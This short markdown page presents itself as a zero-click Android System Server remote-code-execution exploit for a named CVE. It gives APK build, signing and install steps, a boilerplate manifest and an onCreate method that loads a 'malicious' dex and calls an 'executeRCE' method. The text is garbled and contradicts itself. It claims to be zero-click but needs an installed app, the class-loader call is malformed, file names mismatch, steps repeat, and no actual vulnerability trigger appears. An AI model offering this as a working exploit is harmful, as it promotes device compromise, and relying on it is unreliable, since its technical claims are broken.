**Android Zero-Click Exploit**

# Android System Server RCE (CVE-2024-0002)

The Android System Server is responsible for managing system services and processes. By exploiting a vulnerability in this process, an attacker can execute arbitrary code at the system level.

### Deployment and Execution

 1. Build the malicious dex file using the `dx` tool from the 	   	    Android SDK:

		```bash
		dx --dex --output=myexploit.dex myexploit.class
		```

 2. Create a new APK that includes the malicious dex file and any required dependencies:

  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <manifest xmlns:android="http://schemas.android.com/apk/res/android"
      package="com.example.androidexploit">

      <application>
          <activity android:name=".MainActivity">
              <intent-filter>
                  <action android:name="android.intent.action.MAIN" />
                  <category android:name="android.intent.category.LAUNCHER" />
              </intent-filter>
          </activity>
      </application>

  </manifest>
  ```

  3. Sign the APK with a valid signing certificate:

	```bash
	jarsigner -verbose -keystore mykeystore.keystore SysIntel.apk SysIntell
	```

  4. Install the signed APK on a vulnerable device.

      protected void onCreate(Bundle savedInstanceState) {
          super.onCreate(savedInstanceState);
          setContentView(R.layout.activity_main);
  
          // Load the malicious dex file
          String[] paths = getPackageCodePath().split(" ");
          DexClassLoader cl = new DexClassLoader(paths, getPackageCodePath(), null, getClass().getClassLoader());
  
          // Invoke the RCE method from the dex file
          try {
              Method m = cl.loadClass("com.example.malicious.Malware").getDeclaredMethod("executeRCE", String.class);
              m.invoke(null, "Hello, Android!");
          } catch (Exception e) {
              e.printStackTrace();
          }
      }
  }
  ```

### How to Run

   1. Build the malicious dex file using the `dx` tool from the 		   Android SDK:

		```bash
		dx --dex --output=myexploit.dex myexploit.class
		```

  2. Create a new APK that includes the malicious dex file and any required dependencies.

  3. Sign the APK with a valid signing certificate.
